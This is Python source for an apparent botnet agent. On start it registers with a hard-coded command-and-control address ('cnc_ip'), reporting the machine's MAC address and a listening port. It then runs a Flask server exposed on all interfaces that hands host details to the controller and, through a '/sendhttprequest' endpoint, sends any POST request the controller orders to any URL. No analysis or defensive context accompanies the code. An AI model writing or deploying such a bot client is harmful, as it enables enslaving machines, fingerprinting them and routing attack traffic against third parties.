from flask import Flask, request
import re
import uuid
import platform
import psutil
import json
import socket
import requests
import threading

cnc_ip = '10.0.2.15'

def main():
    port = getFreePort()
    server = Server(port)
    threading.Thread(target=lambda: server.run()).start()
    body = {}
    body['mac-address'] = getMacAddress()
    body['running-port'] = port
    requests.post(f"http://{cnc_ip}:5000/register", json=body)

def getFreePort():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('127.0.0.1', 0))
    port = sock.getsockname()[1]
    sock.close()
    return port

def getMacAddress():
    return ':'.join(re.findall('..', '%012x' % uuid.getnode()))

class Server:
    app = Flask(__name__)
    port = None
    def __init__(self, port):
        self.port = port

    def run(self):
        self.app.run(host="0.0.0.0", port=self.port, threaded = True, debug = False, use_reloader = False)

    @app.route('/systeminfo', methods = ['GET'])
    def getSystemInfo():
        info={}
        info['platform'] = platform.system()
        info['platform-release'] = platform.release()
        info['platform-version'] = platform.version()
        info['architecture'] = platform.machine()
        info['hostname'] = socket.gethostname()
        info['mac-address'] = getMacAddress()
        info['processor'] = platform.processor()
        info['ram'] = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        info['processor'] = platform.processor()
        return json.dumps(info)

    @app.route('/sendhttprequest', methods = ['POST'])
    def sendRequest():
        json = request.get_json()

        url = json['url']
        headers = json['headers']
        body = json['body']

        response = requests.post(url, headers=headers, json=body)

        return response.json()

if __name__ == "__main__":
    main()